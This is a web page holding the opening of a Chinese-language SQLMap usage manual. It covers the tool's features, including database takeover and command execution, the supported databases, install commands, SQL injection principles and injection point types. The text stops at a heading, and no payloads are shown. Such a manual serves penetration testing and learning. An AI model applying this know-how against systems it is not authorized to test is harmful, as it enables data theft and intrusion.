<!DOCTYPE html>
<html lang="en"><head><title>SQLMap</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted Grotesk:wght@400;700&amp;family=Source Sans Pro:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Quartz 4"/><meta property="og:title" content="SQLMap"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="SQLMap"/><meta name="twitter:description" content="SQLMap 完整使用手册 一、基础入门 1.1 SQLMap 概述 工具介绍与特性 开源的自动化 SQL 注入检测工具 支持 6 种 SQL 注入技术 强大的检测引擎和数据库接管功能 跨平台支持（Windows/Linux/macOS） 支持的数据库类型 MySQL, Oracle, PostgreSQL, Microsoft SQL Server SQLite, Microsoft Access, Firebird Sybase, SAP MaxDB, IBM DB2 HSQLDB, H2, Informix 等 工作原理与流程 发送测试 payload 到目标参数 分析响应判断是否存在注..."/><meta property="og:description" content="SQLMap 完整使用手册 一、基础入门 1.1 SQLMap 概述 工具介绍与特性 开源的自动化 SQL 注入检测工具 支持 6 种 SQL 注入技术 强大的检测引擎和数据库接管功能 跨平台支持（Windows/Linux/macOS） 支持的数据库类型 MySQL, Oracle, PostgreSQL, Microsoft SQL Server SQLite, Microsoft Access, Firebird Sybase, SAP MaxDB, IBM DB2 HSQLDB, H2, Informix 等 工作原理与流程 发送测试 payload 到目标参数 分析响应判断是否存在注..."/><meta property="og:image:alt" content="SQLMap 完整使用手册 一、基础入门 1.1 SQLMap 概述 工具介绍与特性 开源的自动化 SQL 注入检测工具 支持 6 种 SQL 注入技术 强大的检测引擎和数据库接管功能 跨平台支持（Windows/Linux/macOS） 支持的数据库类型 MySQL, Oracle, PostgreSQL, Microsoft SQL Server SQLite, Microsoft Access, Firebird Sybase, SAP MaxDB, IBM DB2 HSQLDB, H2, Informix 等 工作原理与流程 发送测试 payload 到目标参数 分析响应判断是否存在注..."/><meta property="og:image" content="https://quartz.jzhao.xyz/static/og-image.png"/><meta property="og:image:url" content="https://quartz.jzhao.xyz/static/og-image.png"/><meta name="twitter:image" content="https://quartz.jzhao.xyz/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="quartz.jzhao.xyz"/><meta property="og:url" content="https://quartz.jzhao.xyz/Linux/命令行工具/SQLMap"/><meta property="twitter:url" content="https://quartz.jzhao.xyz/Linux/命令行工具/SQLMap"/><link rel="icon" href="../../static/icon.png"/><meta name="description" content="SQLMap 完整使用手册 一、基础入门 1.1 SQLMap 概述 工具介绍与特性 开源的自动化 SQL 注入检测工具 支持 6 种 SQL 注入技术 强大的检测引擎和数据库接管功能 跨平台支持（Windows/Linux/macOS） 支持的数据库类型 MySQL, Oracle, PostgreSQL, Microsoft SQL Server SQLite, Microsoft Access, Firebird Sybase, SAP MaxDB, IBM DB2 HSQLDB, H2, Informix 等 工作原理与流程 发送测试 payload 到目标参数 分析响应判断是否存在注..."/><meta name="generator" content="Quartz"/><link href="../../index.css" rel="stylesheet" type="text/css" spa-preserve/><style>.expand-button {
  position: absolute;
  display: flex;
  float: right;
  padding: 0.4rem;
  margin: 0.3rem;
  right: 0;
  color: var(--gray);
  border-color: var(--dark);
  background-color: var(--light);
  border: 1px solid;
  border-radius: 5px;
  opacity: 0;
  transition: 0.2s;
}
.expand-button > svg {
  fill: var(--light);
  filter: contrast(0.3);
}
.expand-button:hover {
  cursor: pointer;
  border-color: var(--secondary);
}
.expand-button:focus {
  outline: 0;
}

pre:hover > .expand-button {
  opacity: 1;
  transition: 0.2s;
}

#mermaid-container {
  position: fixed;
  contain: layout;
  z-index: 999;
  left: 0;
  top: 0;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
  display: none;
  backdrop-filter: blur(4px);
  background: rgba(0, 0, 0, 0.5);
}
#mermaid-container.active {
  display: inline-block;
}
#mermaid-container > #mermaid-space {
  border: 1px solid var(--lightgray);
  background-color: var(--light);
  border-radius: 5px;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  height: 80vh;
  width: 80vw;
  overflow: hidden;
}
#mermaid-container > #mermaid-space > .mermaid-content {
  padding: 2rem;
  position: relative;
  transform-origin: 0 0;
  transition: transform 0.1s ease;
  overflow: visible;
  min-height: 200px;
  min-width: 200px;
}
#mermaid-container > #mermaid-space > .mermaid-content pre {
  margin: 0;
  border: none;
}
#mermaid-container > #mermaid-space > .mermaid-content svg {
  max-width: none;
  height: auto;
}
#mermaid-container > #mermaid-space > .mermaid-controls {
  position: absolute;
  bottom: 20px;
  right: 20px;
  display: flex;
  gap: 8px;
  padding: 8px;
  background: var(--light);
  border: 1px solid var(--lightgray);
  border-radius: 6px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
  z-index: 2;
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 32px;
  height: 32px;
  padding: 0;
  border: 1px solid var(--lightgray);
  background: var(--light);
  color: var(--dark);
  border-radius: 4px;
  cursor: pointer;
  font-size: 16px;
  font-family: var(--bodyFont);
  transition: all 0.2s ease;
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:hover {
  background: var(--lightgray);
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:active {
  transform: translateY(1px);
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:nth-child(2) {
  width: auto;
  padding: 0 12px;
  font-size: 14px;
}
/*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiRTpcXFByb2plY3RcXGdpdFxccXVhcnR6XFxxdWFydHpcXGNvbXBvbmVudHNcXHN0eWxlcyIsInNvdXJjZXMiOlsibWVybWFpZC5pbmxpbmUuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0U7RUFDQTs7QUFHRjtFQUNFO0VBQ0E7O0FBR0Y7RUFDRTs7O0FBS0Y7RUFDRTtFQUNBOzs7QUFJSjtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTs7QUFHRjtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBOztBQUdGO0VBQ0U7RUFDQTs7QUFJSjtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0U7O0FBR0Y7RUFDRTs7QUFJRjtFQUNFO0VBQ0E7RUFDQSIsInNvdXJjZXNDb250ZW50IjpbIi5leHBhbmQtYnV0dG9uIHtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBkaXNwbGF5OiBmbGV4O1xuICBmbG9hdDogcmlnaHQ7XG4gIHBhZGRpbmc6IDAuNHJlbTtcbiAgbWFyZ2luOiAwLjNyZW07XG4gIHJpZ2h0OiAwOyAvLyBOT1RFOiByaWdodCB3aWxsIGJlIHNldCBpbiBtZXJtYWlkLmlubGluZS50c1xuICBjb2xvcjogdmFyKC0tZ3JheSk7XG4gIGJvcmRlci1jb2xvcjogdmFyKC0tZGFyayk7XG4gIGJhY2tncm91bmQtY29sb3I6IHZhcigtLWxpZ2h0KTtcbiAgYm9yZGVyOiAxcHggc29saWQ7XG4gIGJvcmRlci1yYWRpdXM6IDVweDtcbiAgb3BhY2l0eTogMDtcbiAgdHJhbnNpdGlvbjogMC4ycztcblxuICAmID4gc3ZnIHtcbiAgICBmaWxsOiB2YXIoLS1saWdodCk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgwLjMpO1xuICB9XG5cbiAgJjpob3ZlciB7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIGJvcmRlci1jb2xvcjogdmFyKC0tc2Vjb25kYXJ5KTtcbiAgfVxuXG4gICY6Zm9jdXMge1xuICAgIG91dGxpbmU6IDA7XG4gIH1cbn1cblxucHJlIHtcbiAgJjpob3ZlciA+IC5leHBhbmQtYnV0dG9uIHtcbiAgICBvcGFjaXR5OiAxO1xuICAgIHRyYW5zaXRpb246IDAuMnM7XG4gIH1cbn1cblxuI21lcm1haWQtY29udGFpbmVyIHtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBjb250YWluOiBsYXlvdXQ7XG4gIHotaW5kZXg6IDk5OTtcbiAgbGVmdDogMDtcbiAgdG9wOiAwO1xuICB3aWR0aDogMTAwdnc7XG4gIGhlaWdodDogMTAwdmg7XG4gIG92ZXJmbG93OiBoaWRkZW47XG4gIGRpc3BsYXk6IG5vbmU7XG4gIGJhY2tkcm9wLWZpbHRlcjogYmx1cig0cHgpO1xuICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuNSk7XG5cbiAgJi5hY3RpdmUge1xuICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaztcbiAgfVxuXG4gICYgPiAjbWVybWFpZC1zcGFjZSB7XG4gICAgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tbGlnaHRncmF5KTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS1saWdodCk7XG4gICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbiAgICB0b3A6IDUwJTtcbiAgICBsZWZ0OiA1MCU7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7XG4gICAgaGVpZ2h0OiA4MHZoO1xuICAgIHdpZHRoOiA4MHZ3O1xuICAgIG92ZXJmbG93OiBoaWRkZW47XG5cbiAgICAmID4gLm1lcm1haWQtY29udGVudCB7XG4gICAgICBwYWRkaW5nOiAycmVtO1xuICAgICAgcG9zaXRpb246IHJlbGF0aXZlO1xuICAgICAgdHJhbnNmb3JtLW9yaWdpbjogMCAwO1xuICAgICAgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuMXMgZWFzZTtcbiAgICAgIG92ZXJmbG93OiB2aXNpYmxlO1xuICAgICAgbWluLWhlaWdodDogMjAwcHg7XG4gICAgICBtaW4td2lkdGg6IDIwMHB4O1xuXG4gICAgICBwcmUge1xuICAgICAgICBtYXJnaW46IDA7XG4gICAgICAgIGJvcmRlcjogbm9uZTtcbiAgICAgIH1cblxuICAgICAgc3ZnIHtcbiAgICAgICAgbWF4LXdpZHRoOiBub25lO1xuICAgICAgICBoZWlnaHQ6IGF1dG87XG4gICAgICB9XG4gICAgfVxuXG4gICAgJiA+IC5tZXJtYWlkLWNvbnRyb2xzIHtcbiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICAgIGJvdHRvbTogMjBweDtcbiAgICAgIHJpZ2h0OiAyMHB4O1xuICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgIGdhcDogOHB4O1xuICAgICAgcGFkZGluZzogOHB4O1xuICAgICAgYmFja2dyb3VuZDogdmFyKC0tbGlnaHQpO1xuICAgICAgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tbGlnaHRncmF5KTtcbiAgICAgIGJvcmRlci1yYWRpdXM6IDZweDtcbiAgICAgIGJveC1zaGFkb3c6IDAgMnB4IDRweCByZ2JhKDAsIDAsIDAsIDAuMSk7XG4gICAgICB6LWluZGV4OiAyO1xuXG4gICAgICAubWVybWFpZC1jb250cm9sLWJ1dHRvbiB7XG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgICAgICB3aWR0aDogMzJweDtcbiAgICAgICAgaGVpZ2h0OiAzMnB4O1xuICAgICAgICBwYWRkaW5nOiAwO1xuICAgICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodCk7XG4gICAgICAgIGNvbG9yOiB2YXIoLS1kYXJrKTtcbiAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4O1xuICAgICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgICAgIGZvbnQtc2l6ZTogMTZweDtcbiAgICAgICAgZm9udC1mYW1pbHk6IHZhcigtLWJvZHlGb250KTtcbiAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMnMgZWFzZTtcblxuICAgICAgICAmOmhvdmVyIHtcbiAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgICB9XG5cbiAgICAgICAgJjphY3RpdmUge1xuICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgxcHgpO1xuICAgICAgICB9XG5cbiAgICAgICAgLy8gU3R5bGUgdGhlIHJlc2V0IGJ1dHRvbiBkaWZmZXJlbnRseVxuICAgICAgICAmOm50aC1jaGlsZCgyKSB7XG4gICAgICAgICAgd2lkdGg6IGF1dG87XG4gICAgICAgICAgcGFkZGluZzogMCAxMnB4O1xuICAgICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgfVxuICAgICAgfVxuICAgIH1cbiAgfVxufVxuIl19 */</style><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../../static/contentIndex.json").then(data => data.json())</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://quartz.jzhao.xyz/index.xml"/></head><body data-slug="Linux/命令行工具/SQLMap"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="../..">Quartz 4</a></h2><div class="spacer mobile-only"></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 1rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div class="search-layout" data-preview="true"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a,b)=>!a.isFolder&amp;&amp;!b.isFolder||a.isFolder&amp;&amp;b.isFolder?a.displayName.localeCompare(b.displayName,void 0,{numeric:!0,sensitivity:\&quot;base\&quot;}):!a.isFolder&amp;&amp;b.isFolder?1:-1&quot;,&quot;filterFn&quot;:&quot;node=>node.slugSegment!==\&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;node=>node&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-42"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-42" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#"></a></li></template><template id="template-folder"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../Linux/">Linux</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../Linux/命令行工具/">命令行工具</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>SQLMap</a></div></nav><h1 class="article-title">SQLMap</h1><p show-comma="true" class="content-meta"><time datetime="2025-11-10T12:00:11.000Z">Nov 10, 2025</time><span>33 min read</span></p></div></div><article class="popover-hint"><h1 id="sqlmap-完整使用手册">SQLMap 完整使用手册<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#sqlmap-完整使用手册" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<h2 id="一基础入门">一、基础入门<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#一基础入门" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="11-sqlmap-概述">1.1 SQLMap 概述<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11-sqlmap-概述" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<ul>
<li>
<p><strong>工具介绍与特性</strong></p>
<ul>
<li>开源的自动化 SQL 注入检测工具</li>
<li>支持 6 种 SQL 注入技术</li>
<li>强大的检测引擎和数据库接管功能</li>
<li>跨平台支持（Windows/Linux/macOS）</li>
</ul>
</li>
<li>
<p><strong>支持的数据库类型</strong></p>
<ul>
<li>MySQL, Oracle, PostgreSQL, Microsoft SQL Server</li>
<li>SQLite, Microsoft Access, Firebird</li>
<li>Sybase, SAP MaxDB, IBM DB2</li>
<li>HSQLDB, H2, Informix 等</li>
</ul>
</li>
<li>
<p><strong>工作原理与流程</strong></p>
<ol>
<li>发送测试 payload 到目标参数</li>
<li>分析响应判断是否存在注入</li>
<li>识别数据库类型和版本</li>
<li>根据注入类型选择合适技术</li>
<li>执行数据枚举或系统命令</li>
</ol>
</li>
<li>
<p><strong>安装与环境配置</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Kali Linux 预装</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -h</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 其他系统安装</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> clone</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --depth</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://github.com/sqlmapproject/sqlmap.git</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sqlmap</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sqlmap.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -h</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Python 3 依赖</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">pip3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> requirements.txt</span></span></code></pre></figure>
</li>
</ul>
<h3 id="12-sql注入基础">1.2 SQL注入基础<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12-sql注入基础" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<ul>
<li>
<p><strong>SQL注入原理</strong></p>
<ul>
<li>用户输入未经过滤直接拼接到 SQL 语句</li>
<li>攻击者构造恶意 SQL 代码改变查询逻辑</li>
<li>可导致数据泄露、权限提升、系统控制</li>
</ul>
</li>
<li>
<p><strong>注入点类型分类</strong></p>
<ul>
<li>GET 参数注入：URL 查询参数</li>
<li>POST 参数注入：表单提交数据</li>
<li>Cookie 注入：Cookie 字段</li>
<li>HTTP 头注入：User-Agent、Referer、X-Forwarded-For 等</li>
<li>JSON/XML 注入：API 请求体</li>
<li>二阶注入：存储后触发的注入</li>
</ul>
</li>
<li>
<p><strong>手工注入与自动化对比</strong></p>



































